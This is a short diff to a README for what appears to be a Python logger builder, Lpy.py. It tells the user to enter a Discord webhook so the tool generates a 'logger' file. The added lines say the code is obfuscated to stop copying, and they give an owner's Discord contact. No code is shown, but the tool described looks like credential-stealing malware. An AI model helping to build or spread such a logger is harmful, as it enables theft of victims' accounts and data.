@@ -10,6 +10,10 @@ need to have python (last version)
 open Lpy.py file and it need to apen a python tab that says put webhook
 
 after that press enter and should create a file and that file is ur logger
+
+# Obfuscated
+why ? Bc Not Copy Code XD
+
 # Contact Owner
 discord RlxeDeveloper#0139
 
